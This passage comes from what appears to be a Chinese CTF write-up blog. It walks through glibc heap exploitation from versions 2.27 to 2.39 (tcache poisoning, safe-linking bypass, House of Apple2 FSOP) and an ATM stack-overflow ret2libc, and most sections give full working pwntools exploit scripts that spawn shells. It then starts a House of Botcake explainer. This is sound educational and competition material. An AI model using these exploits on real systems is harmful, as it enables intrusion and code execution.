0x68\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\nonegadget = libc_base + 0xf1247\nlog.success('one==>'+hex(onegadget))\n\nfake_chunk = malloc_hook - 0x23\nlog.success('fake==>'+hex(fake_chunk))\ndelete(1)\nedit(1,p64(fake_chunk))\nadd(5,0x60)\nadd(6,0x60)\nedit(6,b'a' * (0x10 + 0x03) + p64(onegadget))\ngdb.attach(p)\nadd(7,0)\np.interactive()\n```\n\n## 2.27\n这题开始我换虚拟机做了，因为docker里少了点东西\n### checksec\n\n![image.png](https://s2.loli.net/2024/06/02/TCgYfRwJapLWK7v.png)\n\n### 思路\nglibc-2.27版本引入了tcache，但此时还没引入tcache的检测，所以基本就是想怎么申请都行，在这里我们劫持**free_hook为system**来getshell，**free一个内容含/bin/sh\\x00的堆块即可**\n\n![image.png](https://s2.loli.net/2024/06/02/7iqUTKrcBHhExfD.png)\n\n原始free_hook\n\n![image.png](https://s2.loli.net/2024/06/02/CFthelRT1Vm6dx4.png)\n\nedit过后的free_hook\n\n![image.png](https://s2.loli.net/2024/06/02/c7zkgR1ZhpaLKoF.png)\n\n修改堆块内容为/bin/sh\\x00并free即可\n\n![image.png](https://s2.loli.net/2024/06/02/cpyqN1BdWChmDtO.png)\n\n### Payload\n```Python\nfrom pwn import *\ncontext(arch = 'amd64',os = 'linux', log_level = 'debug')\ncontext.terminal = ['tmux','splitw','-h']\n\np = process('./heap')\n# p = remote('node1.anna.nssctf.cn',28190)\nlibc = ELF('./libc.so.6')\n\ndef add(idx,size):\n    p.recvuntil('>>')\n    p.sendline(b'1')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('size? ')\n    p.sendline(str(size))\n\ndef delete(idx):\n    p.recvuntil('>>')\n    p.sendline(b'2')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef show(idx):\n    p.recvuntil('>>')\n    p.sendline(b'3')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef edit(idx,content):\n    p.recvuntil('>>')\n    p.sendline(b'4')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('content : ')\n    p.send(content)\n\nfor i in range(10):\n    add(i,0x80)\nfor i in range(10):\n    delete(i)\n\nshow(7)\np.recvuntil('content : ')\nmalloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x70\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\n\nonegadget = libc_base + 0x4f302\nsystem = libc_base + libc.sym['system']\nfree_hook = libc_base + libc.sym['__free_hook']\ngdb.attach(p)\nedit(6,p64(free_hook))\nadd(10,0x80)\nadd(11,0x80)\nedit(11,p64(system))\nadd(12,0x80)\nedit(12,b'/bin/sh\\x00')\ndelete(12)\n\np.interactive()\n```\n\n## 2.31\n### checksec\n![image.png](https://s2.loli.net/2024/06/02/gE9mkDQuBSYRoZc.png)\n\n### 思路\n这道题的解法和上边几乎一模一样，只是**多了tcache_bins的长度检测**，会**检测bins上的个数是否和申请的匹配**，不匹配的话没法申请出来。比如说tcache_bins上0x90的chunk个数为0，但是我们gdb里显示我们劫持的地址还没申请出来，这个时候如果malloc的话是无效的，没法申请出来。所以要是想劫持hook地址，我们就需要至少两个堆块被free进了tcache_bins里，修改头指针fd为hook即可\n\n直接onegadget\n\n### Payload\n```Python\nfrom pwn import *\ncontext(arch = 'amd64',os = 'linux', log_level = 'debug')\ncontext.terminal = ['tmux','splitw','-h']\n\n# p = process('./heap')\np = remote('node2.anna.nssctf.cn',28168)\nlibc = ELF('./libc.so.6')\n\ndef add(idx,size):\n    p.recvuntil('>>')\n    p.sendline(b'1')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('size? ')\n    p.sendline(str(size))\n\ndef delete(idx):\n    p.recvuntil('>>')\n    p.sendline(b'2')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef show(idx):\n    p.recvuntil('>>')\n    p.sendline(b'3')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef edit(idx,content):\n    p.recvuntil('>>')\n    p.sendline(b'4')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('content : ')\n    p.send(content)\n\nfor i in range(10):\n    add(i,0x80)\nfor i in range(10):\n    delete(i)\nshow(7)\np.recvuntil('content : ')\nmalloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x70\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\n\nonegadget = libc_base + 0xe3b01\nedit(6,p64(malloc_hook))\nadd(10,0x80)\nadd(11,0x80)\nedit(11,p64(onegadget))\nadd(12,0x80)\n\np.interactive()\n```\n\n## 2.35\n这道题我在比赛的时候没打出来，赛后才弄出来。\n### checksec\n\n![image.png](https://s2.loli.net/2024/06/03/EIiBvu2PdNGjJSm.png)\n这题我最开始做的时候没有checksec，没看到canary导致后续一直出错...\n\n### 思路\n\n做这题的时候就需要看add的源码了\n\n![image.png](https://s2.loli.net/2024/06/03/oDxdMRXsncGwSlY.png)\n\n可以看到，**所有malloc的堆块都由指针数组ptr来管理**，因为开启了canary,不能往栈内修改，只能往rbp及下的位置，所以我们若是能让ptr的元素之一指向栈的返回地址，修改edit函数的rbp为ROP链修改返回地址为ROP链，我们是否就能getshell了呢？为了达成攻击效果，我们得布置好堆。\n\n不过需要注意的是，我们**必须在edit修改完返回地址后直接在edit内getshell**，因为add与edit栈帧一致，共享同一rbp指向的地址，若是我们edit了rbp，而**add从tcache_bins取chunk，chunk的地址是我们的rbp，而rbp+8的位置会被当做tcache_key而被清空**，导致我们**add时返回了非法地址'0'**，使得我们还没getshell就GOF了\n\n首先通过unsorted_bins泄露libc，在free一个tcache_bins区间内的chunk并移位获得heap_base(2.35新增的保护机制)\n```Python\nadd(0,0x410)\nadd(1,0x60)\nadd(2,0x60)\ndelete(0)\nshow(0)\np.recvuntil('content : ')\nmain_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x60\nlog.success('main_arena==>'+hex(main_arena))\nlibc_base = main_arena - 0x219C80\nlog.success('libc_base==>'+hex(libc_base))\n\ndelete(1)\nshow(1)\np.recvuntil('content : ')\nheap_base = u64(p.recv(5).ljust(8,b'\\x00')) << 12 #在2.35中，为保护tcache_bins，会对它们的fd向右移3位，一般我们泄露的都是尾指针的fd，此时只用把它向左移3位填充\\x00即是heap_base\nlog.success('heap_base==>'+hex(heap_base))\n```\n\n![image.png](https://s2.loli.net/2024/06/03/wEgHLzA9jQNMd84.png)\n\n![image.png](https://s2.loli.net/2024/06/03/BOlMz6WGfIXJhNL.png)\n\nOK，在泄露完libc和heap_base后，我们就来用environ来泄露栈地址\n```Python\nenviron = libc_base + libc.symbols['environ']\nlog.success('environ==>'+hex(environ))\ndelete(2)\nedit(2,p64((heap_base >> 12) ^ (environ))) #也是2.35的保护机制之一，若是想修改fd，得先heap_base移位然后与target_addr疑惑，这样申请下来的堆块才是我们的目标地址\nadd(3,0x60)\nadd(4,0x60)\nshow(4)\np.recvuntil('content : ')\nstack = u64(p.recv(6).ljust(8,b'\\x00')) - 0x120\nlog.success('stack==>'+hex(stack))\n```\n![image.png](https://s2.loli.net/2024/06/03/zX7EjxrSLDFVtsZ.png)\n\n有了栈地址后，我们还需要程序的虚拟地址，根据相对偏移来计算出ptr指针数组的地址，来进行修改\n\n```Python\nadd(5,0x60)\ndelete(5)\ndelete(3)\nedit(3,p64((heap_base >> 12) ^ (stack-0x08)))\nadd(6,0x60)\nadd(7,0x60)\nedit(7,b'a' * 0x18)\n# gdb.attach(p)\nshow(7)\np.recvuntil('content : ')\np.recv(0x18)\nelf_main = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('elf_main==>'+hex(elf_main))\nptr = elf_main + 0x28BF\nlog.success('ptr==>'+hex(ptr))\n```\n\n![image.png](https://s2.loli.net/2024/06/03/C1wFbeg2EOsoyuD.png)\n\n![image.png](https://s2.loli.net/2024/06/03/SGdL15bxjeDZhFR.png)\n\n![image.png](https://s2.loli.net/2024/06/03/fODgxZWBdJ4vLse.png)\n\n现在该有的基本都有的，该去修改统筹chunk的ptr来getshell了\n```Python\nrdi = libc_base + 0x23b6a\nret = libc_base + 0x22679\nsystem = libc_base + libc.symbols['system']\nbinsh_addr = libc_base + next(libc.search(b'/bin/sh'))\nadd(8,0x60)\ndelete(8)\ndelete(3)\nedit(3,p64((heap_base >> 12) ^ (ptr+0x30)))\nadd(9,0x60)\nadd(10,0x60)\nedit(10,p64(0) + p64(stack-0x20))\nedit(7,p64(ret) + p64(rdi) + p64(binsh_addr) + p64(system))#system函数里有个十六字节对齐检测，不通过的话会报错，所以要加个ret\n```\n\n先看我们的ptr的指向\n\n![image.png](https://s2.loli.net/2024/06/03/uwB3sKoxI2GUpmA.png)\n\n申请进去后的指向，此时就已经指向了我们edit的返回地址了\n\n![image.png](https://s2.loli.net/2024/06/03/tiFlGHLo86Bd3gJ.png)\n\n再edit一次ret为ROP链即可getshell\n\n![image.png](https://s2.loli.net/2024/06/03/CKktZ58oW2my9le.png)\n\n![image.png](https://s2.loli.net/2024/06/03/Ui3JGnQhNKfeuAX.png)\n\n### Payload\n```Python\nfrom pwn import *\ncontext(arch = 'amd64',os = 'linux', log_level = 'debug')\ncontext.terminal = ['tmux','splitw','-h']\n\np = process('./heap')\n# p = remote('node1.anna.nssctf.cn',28190)\nlibc = ELF('./libc.so.6')\n\ndef add(idx,size):\n    p.recvuntil('>>')\n    p.sendline(b'1')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('size? ')\n    p.sendline(str(size))\n\ndef delete(idx):\n    p.recvuntil('>>')\n    p.sendline(b'2')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef show(idx):\n    p.recvuntil('>>')\n    p.sendline(b'3')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef edit(idx,content):\n    p.recvuntil('>>')\n    p.sendline(b'4')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('content : ')\n    p.send(content)\n\n\nadd(0,0x410)\nadd(1,0x60)\nadd(2,0x60)\ndelete(0)\nshow(0)\np.recvuntil('content : ')\nmain_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x60\nlog.success('main_arena==>'+hex(main_arena))\nlibc_base = main_arena - 0x219C80\nlog.success('libc_base==>'+hex(libc_base))\n\ndelete(1)\nshow(1)\np.recvuntil('content : ')\nheap_base = u64(p.recv(5).ljust(8,b'\\x00')) << 12\nlog.success('heap_base==>'+hex(heap_base))\nenviron = libc_base + libc.symbols['environ']\nlog.success('environ==>'+hex(environ))\nsystem = libc_base + libc.symbols['system']\nlog.success('system==>'+hex(system))\nbinsh_addr = libc_base + next(libc.search(b'/bin/sh'))\nlog.success('binsh_addr==>'+hex(binsh_addr))\n\ndelete(2)\nedit(2,p64((heap_base >> 12) ^ (environ)))\nadd(3,0x60)\nadd(4,0x60)\nshow(4)\np.recvuntil('content : ')\nstack = u64(p.recv(6).ljust(8,b'\\x00')) - 0x120\nlog.success('stack==>'+hex(stack))\n\nrdi = libc_base + 0x23b6a\nret = libc_base + 0x22679\n\nadd(5,0x60)\ndelete(5)\ndelete(3)\nedit(3,p64((heap_base >> 12) ^ (stack-0x08)))\nadd(6,0x60)\nadd(7,0x60)\nedit(7,b'a' * 0x18)\nshow(7)\np.recvuntil('content : ')\np.recv(0x18)\nelf_main = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('elf_main==>'+hex(elf_main))\nptr = elf_main + 0x28BF\nlog.success('ptr==>'+hex(ptr))\n\nadd(8,0x60)\ndelete(8)\ndelete(3)\nedit(3,p64((heap_base >> 12) ^ (ptr+0x30)))\nadd(9,0x60)\nadd(10,0x60)\nedit(10,p64(0) + p64(stack-0x20))\ngdb.attach(p)\nedit(7,p64(ret) + p64(rdi) + p64(binsh_addr) + p64(system))\n\np.interactive()\n```\n\n### 碎碎念\n比赛的时候的坑我是一踩一个准...忘记了tcache的机制，还想着怎么add后的返回地址是非法地址0呢，然后又因为canary问题，一直没想到该怎么修改。后面忍痛割爱想用large_bins_attack，但是一直没弄出来。赛后再看函数才注意到指针数组ptr，才想到该怎么成功修改ret地址，果然还是不能太着急啊——\n\n## 2.39\n### 新题目源码\n\nadd函数新增源码，**限定size大小为large_bins的区间**，所以典型的就是利用large_bins_attack\n\n![image.png](https://s2.loli.net/2024/06/05/2lsGt13N9OcCBhm.png)\n\n### 新增保护机制\n\n在这种最新的高版本中，又增加了一些改动和对堆的检测\n\n#### 一\n\n**对tcache的指针进行加密**，除了尾指针还能仅通过移位获得heap_base以外，其余的都被加密成了些奇怪的数据\n\n以下是我编写的一个小程序来了解这个机制将指针变成了什么样\n\n```C\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n#include<unistd.h>\n\nint main(){\n    size_t *p1 = malloc(0x80);\n    size_t *p2 = malloc(0x80);\n    size_t *p3 = malloc(0x80);\n    size_t *p4 = malloc(0x80);\n    size_t *p5 = malloc(0x80);\n    free(p4);\n    free(p3);\n    free(p2);\n    free(p1);\n    return 0;\n}\n```\n\n在free到p1时，堆空间是这样的\n\n![image.png](https://s2.loli.net/2024/06/06/WPTBs4Ji5bKrzLe.png)\n\n查看一下各个堆的内容\n\n![image.png](https://s2.loli.net/2024/06/06/npyoCckJIRaVM7U.png)\n\n可以看到,bk都被加密成了同一个数据，而fd只有尾指针是正常的跟以前没什么差别，其余的多少都经过了加密，还有些事一样的加密。具体是怎样加密的等以后研究。\n\n总的来说，对tcache的数据进行了加密，限制了对tcache的利用，不过一般来说我们也只用尾指针泄露heap_base就是了\n\n#### 二\n\n对基地址进行了修改，在我们以前都是以```\\x7f```开头的，但是在如今的版本，连基地址也进行了随机化，成了```\\x7x```开头，x位于0-f区间内，意味着我们现在接收数据**只能用```recv(6)```**，而**不能用```recvuntil('\\x7f')```**，比如：\n\n![image.png](https://s2.loli.net/2024/06/06/AIF391CVTQvU2ht.png)\n\n可以明显看到与我们常见的libc大相径庭，意味着**以后我们在接收基地址的时候会更加麻烦，如果没有字符串让我们进行定位的话，可能就得推敲它的偏移地址了，得一步步动调**\n\n### 思路\n\n在高版本中，目前而言最好用且用途最广泛的IO攻击方式就是House of Apple了，只用一次large_bin_attack就可以实现我们getshell或者其他目的。这里我选择用House of Apple2的_IO_wfile_overflow函数控制执行流\n\n强力推荐<a href=\"https://bbs.kanxue.com/thread-273832.htm#msg_header_h1_0\" style=\"text-decoration:none; color:blue;\">roderick01师傅原创的House of Apple系列</a>！\n\n### leak libc and heap_base\n\n```Python\nadd(8,0x508) #为后序伪造_IO_FILE结构体做准备\nadd(0,0x510) #伪造的_IO_FILE结构体主体\nadd(1,0x500) \nadd(2,0x520) #泄露libc和heap\nadd(3,0x500)\n\ndelete(2)\nadd(4,0x550) #分配2进large_bins\n# gdb.attach(p)\nshow(2)\np.recvuntil('content : ')\nlarge_bin = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('large_bin==>'+hex(large_bin))\nlibc_base = large_bin - 0x203F50\nlog.success('libc_base==>'+hex(libc_base))\nIO_list_all = libc_base + libc.symbols['_IO_list_all']\nlog.success('IO_list_all==>'+hex(IO_list_all))\nIO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']\nlog.success('IO_wfile_jumps==>'+hex(IO_wfile_jumps))\nsystem = libc_base + libc.symbols['system']\nlog.success('system==>'+hex(system))\n\nedit(2,b'a'*0x10) #修改至fd_nextsize,该指针此时指向的是自己，根据这个计算出heap_base\n# gdb.attach(p)\nshow(2)\np.recvuntil('content : ')\np.recvuntil('aaaaaaaaaaaaaaaa')\nheap_addr = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('heap_addr==>'+hex(heap_addr))\nheap_base = heap_addr - 0x11d0\nlog.success('heap_base==>'+hex(heap_base))\n```\n\n### 伪造IO_FILE结构体\n```Python\ndelete(0) #为后续实现任意地址写做准备\nedit(2,p64(large_bin) + p64(large_bin) + p64(heap_addr) + p64(IO_list_all - 0x20))  #伪造bk_nextsize指针\nadd(5,0x550) #chunk0的bk_nextsize指向_IO_list_all - 0x20，_IO_list_all指向chunk0\nchunk = heap_addr - 0xa30 #chunk0的首地址\nlog.success('chunk==>'+hex(chunk))\nedit(8, b'a' * 0x500 + p32(0xfffff7f5) + b';sh\\x00')  #修改chunk0的prev为0x68733bfffff7f5,也就是伪造的_IO_FILE的flag位。其中前四字节为';sh\\x00'的ASCII值，后四字节中，高的二字节作用为屏蔽flag最高的四字节，意味着检测的时候检测不到我们的';sh\\x00'。后面的f7f5设立了很多状态，跟后续的攻击有关，建议丢给GPT解释\n\nfake_IO = p64(0) * 2 + p64(1) + p64(2) #from _IO_read_end to _IO_write_ptr，当write_ptr>write_base时，会调用overflow\nfake_IO = fake_IO.ljust(0xa0 - 0x10,b'\\x00') + p64(chunk + 0x100) #wide_data\nfake_IO = fake_IO.ljust(0xc0 - 0x10,b'\\x00') + p64(0xffffffffffffffff) #mode\nfake_IO = fake_IO.ljust(0xd8 - 0x10,b'\\x00') + p64(IO_wfile_jumps) #vtable\nfake_IO = fake_IO.ljust(0x100 - 0x10 + 0xe0,b'\\x00') + p64(chunk + 0x200) #_wide_data->_wide_vtable，当write_ptr>write_base且_IO_buf_base为空，会调用_IO_wdoallocbuf\nfake_IO = fake_IO.ljust(0x200 - 0x10,b'\\x00') + p64(0) * 13 + p64(system) # _wide_data->_wide_vtable->doallocate\n\nedit(0,fake_IO)\n```\n\n解释下后边的fake_IO。\n\n在调用exit函数时，会有这样的调用链\n\n```exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_OVERFLOW```\n\n最后会调用_IO_list_all来遍历每一个_IO_FILE结构体，满足一定条件会调用vtable->overflow函数指针指向的函数。\n\n在这里，我们将wide_data指向chunk+0x100,将_wide_data结构体的_wide_vtable指针指向chunk+0x200，**将(_IO_FILE->_wide_data->_wide_vtable + 0x68)(fp)修改成了system(';sh\\x00')**，至于为什么这样修改就详见roderick01师傅的文章了。我来大概阐述下调用流程\n\n_IO_list_all指向我们伪造的_IO_FILE结构体chunk,将vtable指向了_IO_wfile_jumps,_IO_wfile_jumps调用了结构体中的_IO_file_overflow函数，_IO_file_overflow函数调用了_IO_wdoallocbuf(调用这个是经历的一系列检测的，跟前边的伪造有关),又通过两层检验后最终调用到我们的```(_IO_FILE->_wide_data->_wide_vtable + 0x68)(fp)```(这个结构也跟我们```_IO_jump_t```有关)。也就是我们的```chunk->chunk+0x100->chunk+0x200+0x68(';sh\\x00')```，至此，我们的攻击就完成了接下来只要**主动触发exit函数**就好\n\n来看看修改后的chunk长什么样\n\n![image.png](https://s2.loli.net/2024/06/06/ntgJoUAhIy7ajFk.png)\n\n就挺神奇的，不过我们这个调用链没有用到fcloseall，是因为我们设置的flag位里不许调用该函数了，也算个小点吧\n\n![image.png](https://s2.loli.net/2024/06/06/WX17AUPsMVS8Rzj.png)\n\n### Payload\n```Python\nfrom pwn import *\ncontext(arch = 'amd64', os = 'linux', log_level = 'debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./heap')\nlibc = ELF('./libc.so.6')\n\ndef add(idx,size):\n    p.recvuntil('>>')\n    p.sendline(b'1')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('size? ')\n    p.sendline(str(size))\n\ndef delete(idx):\n    p.recvuntil('>>')\n    p.sendline(b'2')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef show(idx):\n    p.recvuntil('>>')\n    p.sendline(b'3')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef edit(idx,content):\n    p.recvuntil('>>')\n    p.sendline(b'4')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('content : ')\n    p.send(content)\n\nadd(8,0x508)\nadd(0,0x510)\nadd(1,0x500)\nadd(2,0x520)\nadd(3,0x500)\ndelete(2)\nadd(4,0x550)\nshow(2)\np.recvuntil('content : ')\nlarge_bin = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('large_bin==>'+hex(large_bin))\nlibc_base = large_bin - 0x203F50\nlog.success('libc_base==>'+hex(libc_base))\nIO_list_all = libc_base + libc.symbols['_IO_list_all']\nlog.success('IO_list_all==>'+hex(IO_list_all))\nIO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']\nlog.success('IO_wfile_jumps==>'+hex(IO_wfile_jumps))\nsystem = libc_base + libc.symbols['system']\nlog.success('system==>'+hex(system))\n\nedit(2,b'a'*0x10)\nshow(2)\np.recvuntil('content : ')\np.recvuntil('aaaaaaaaaaaaaaaa')\nheap_addr = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('heap_addr==>'+hex(heap_addr))\nheap_base = heap_addr - 0x11d0\nlog.success('heap_base==>'+hex(heap_base))\n\ndelete(0)\nedit(2,p64(large_bin) + p64(large_bin) + p64(heap_addr) + p64(IO_list_all - 0x20))\nadd(5,0x550)\nchunk = heap_addr - 0xa30\nlog.success('chunk==>'+hex(chunk))\nedit(8, b'a' * 0x500 + p32(0xfffff7f5) + b';sh\\x00') \n\nfake_IO = p64(0) * 2 + p64(1) + p64(2)\nfake_IO = fake_IO.ljust(0xa0 - 0x10,b'\\x00') + p64(chunk + 0x100) #wide_data\nfake_IO = fake_IO.ljust(0xc0 - 0x10,b'\\x00') + p64(0xffffffffffffffff) #mode\nfake_IO = fake_IO.ljust(0xd8 - 0x10,b'\\x00') + p64(IO_wfile_jumps) #vtable\nfake_IO = fake_IO.ljust(0x100 - 0x10 + 0xe0,b'\\x00') + p64(chunk + 0x200) #_wide_data->_wide_vtable\nfake_IO = fake_IO.ljust(0x200 - 0x10,b'\\x00') + p64(0) * 13 + p64(system) # _wide_data->_wide_vtable->doallocate\n\nedit(0,fake_IO)\ngdb.attach(p)\np.recvuntil('>>')\np.sendline(b'5')\np.interactive()\n\n```\n\n### 碎碎念\n这个堆题让我学到了好多...对初学堆的人来说，确实是一道很有价值的题目，还让我了解了2.39的一些新机制，挺好的\n\n**不过研究得我确实想撞墙，光配个24.04的虚拟机弄得我红温，pip都成外部管理包了，不允许直接使用，还得```--break-system-packages```**...\n\n# ATM\n## checksec\n![image.png](https://s2.loli.net/2024/06/07/9sGFqBgbV4S8iDw.png)\n\n## 源审\n\n![image.png](https://s2.loli.net/2024/06/07/fscx83XR5KjhPVk.png)\n\n![image.png](https://s2.loli.net/2024/06/07/HUsNqjuQz4PwFGI.png)\n\n可以看到有明显的栈溢出，修改一下nbyte的大小达成栈溢出条件后，用ret2libc即可\n\n## Payload\n```Python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\ncontext(arch = 'amd64', os = 'linux', log_level = 'debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./app')\np = remote('node4.anna.nssctf.cn',28409)\nelf = ELF('./app')\n# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\np.recvuntil(b'password')\np.sendline(b'Dusk')\np.recvuntil(b'4.Exit')\np.sendline(b'3')\np.recvuntil(b'deposit')\np.sendline(b'1000')\n\n# gdb.attach(p)\np.recvuntil(b'4.Exit')\np.sendline(b'5')\np.recvuntil(b'gift:')\nprintf = int(p.recv(14),16)\nlog.success('printf==>'+hex(printf))\nlibc = LibcSearcher(\"printf\",printf)\nlibc_base = printf - libc.dump(\"printf\")\nsystem = libc_base + libc.dump(\"system\")\nbinsh = libc_base + libc.dump(\"str_bin_sh\")\n\npop_rdi = 0x401233\npop_ret = 0x40101a\n\npayload = b'a' * 0x168  + p64(pop_ret) + p64(pop_rdi) + p64(binsh) + p64(system)\npause()\np.sendline(payload)\n\np.recvuntil(b'4.Exit')\np.sendline(b'4')\np.interactive()\n```\n\n原本想上网站搜版本的，结果我的网站炸了没法进...所以就用了LibcSearcher，不过它居然还能搜到2.35的版本，看来是更新了？\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Stack","Pwn","wp"],"categories":["网络安全"]},{"title":"House of Botcake","url":"/2024/05/24/House of Botcake/","content":"\n\n\n# 个人理解\n\n感觉House of Botcake就是**double free + overlapping + _IO_FILE attack**的结合使用，需要**对堆结构有着较为详细的理解**，也要有能管理堆顺序的能力，建议写题的时候还是**标一标堆的index**，这样在利用堆的时候会比较方便些\n\n# House of Botcake\n想要利用这个攻击，我们得**先了解_IO_FILE的结构**\n## _IO_FILE\n### 结构\n```\npwndbg> p stdout\n$3 =(FILE *)0x7f8aba48f760 < I0 2 1 stdout >\npwndbg> ptype stdout\ntype = struct IO FILE {\nint flags; #flag得记得伪造\nchar * Io read ptr;\nchar * Io read end;\nchar * I0 read base,\nchar * I0 write base; #这三个write是我们攻击中的核心部分\nchar * I0 write ptr;\nchar * I0 write end;\nchar * Io buf base;\nchar * Io buf end;\nchar * I0 save base;\nchar * I0 backup base;\nchar * I0 save end;\nstruct I0 marker * markers;\nstruct IO FILE * chain;\nint fileno;\nint flags2;\noff t old offset;\nunsigned short cur column;\nsigned char vtable offset;\nchar shortbuf[1l;\nI0 lock t * lock;\noff64 t offset;\nstruct\nI0 codecvt * codecvt;\nstruct Io wide data * wide data;\nstruct\nIO FILE * freeres list;\nvoid * freeres buf;\nsize tpad5;\nint mode;\nchar unused2[20];\n} *\n```\n### _flag详情\n```\n#define _IO_MAGIC 0xFBAD0000 /* Magic number */\n#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */\n#define _IO_MAGIC_MASK 0xFFFF0000\n#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */\n#define _IO_UNBUFFERED 2\n#define _IO_NO_READS 4 /* Reading not allowed */\n#define _IO_NO_WRITES 8 /* Writing not allowd */\n#define _IO_EOF_SEEN 0x10\n#define _IO_ERR_SEEN 0x20\n#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */\n#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/\n#define _IO_IN_BACKUP 0x100\n#define _IO_LINE_BUF 0x200\n#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */\n#define _IO_CURRENTLY_PUTTING 0x800\n#define _IO_IS_APPENDING 0x1000\n#define _IO_IS_FILEBUF 0x2000\n#define _IO_BAD_SEEN 0x4000\n#define _IO_USER_LOCK 0x8000\n```\n我们需要关注的只有三个，**_IO_MAGIC 0xFBAD0000,_IO_IS_APPENDING 0x1000,_IO_CURRENTLY_PUTTING**,通常情况下_flag为0xfbad2887，而我们攻击的时候常常需要**把_flag修改为0xfbad1800**，这正好对应这三个flag值\n### 解释\n为什么要这样设置呢？\n\n首先，我们在这种攻击方式下，用的基本是puts函数，puts函数会经历以下函数调用\n``puts->_IO_file_xsputn->_IO_file_overflow->_IO_do_write``\n\n下面我来详细解释下这些flag值的作用\n\n当``_IO_CURRENTLY_PUTTING=0x800时``通常表示当前文件流正在**进行写入操作**。\n\n``IO_IS_APPENDING=0x1000``表示文件流**是否以追加模式打开**。\n\n``IO_MAGIC=0xFBAD0000``表示**_IO_FILE结构是有效的**\n\n在_IO_FILE有效的情况下，因为我们以追加模式进行写入操作，如果我们把`_IO_write_base，_IO_write_ptr`分别设置为**想要泄露的地方，结束泄露的地址**，我们就可以**通过environ函数的存在泄露出栈地址**，从而获得当前函数的返回地址，进行一系列操作\n## 原理\n在libc大于2.27版本之后，为了防止tcache攻击过于简单而引入了**tcache_key**，对应的位置是**堆块的bk**。当堆块被free进入tcache_bin后，**如果遍历该大小的tcache_bin发现有相同地址的堆块就会触发double_free警告，从而被killed掉**\n而House of Botcake，充分利用了这一机制，如果将同一堆块**一次free进unsorted_bin**里（没有key），**一次free进tcache_bin里**，是不是就绕过检查了呢？这样就让double_free再度成为可能\n## 大致思路\n先申请十个堆块，然后一如既往填满tcache先，第十个堆块用来防止与top chunk合并\n\n![image](https://s2.loli.net/2024/12/02/aQXHVK592xLrtWY.png)\n\n接着再free第九个堆块(index=8)，使它进入unsorted_bin\n\n![image](https://s2.loli.net/2024/12/02/D43g8W1s6zGFQpP.png)\n\n此时完成了把目标堆块扔进unsorted_bin里，但我们还需要再free第八个堆块，此时会**触发chunk合并**\n\n![image](https://s2.loli.net/2024/12/02/fM8sv6nZ2tyWNqo.png)\n\n![image](https://s2.loli.net/2024/12/02/cGuik9evCg7MNtR.png)\n\n这种攻击方法常常需要**修改fd指针**来达成我们需要的操作，我们目标堆块尾地址为720，为了控制到该堆块，我们先申请一个多余堆块给目标堆块腾位置\n\n![image](https://s2.loli.net/2024/12/02/B9ovWnp7ljacRmy.png)\n\n接着我们再次free第九个堆块，实现double_free\n\n![image](https://s2.loli.net/2024/12/02/guKBtbGMJZFxUXc.png)\n\n此时我们完成了我们的目的，实现了double_free，接下来就是**切割unsorted_bin的堆块**了，这里我选择切割0x70的堆块\n\n![image](https://s2.loli.net/2024/12/02/2E5ltOuKRbLCBWT.png)\n\n那么下次我们再申请出0x70的堆块时，**data域就是710，对应720的prev和size**，我们就可以轻而易举操控fd啦。后续还可接着free这两个堆块进行长久地fd指针修改，进行任意操作，整个流程差不多如此。\n\n## 例题：[CISCN 2022 华东北]blue\n### 代码审计\n#### 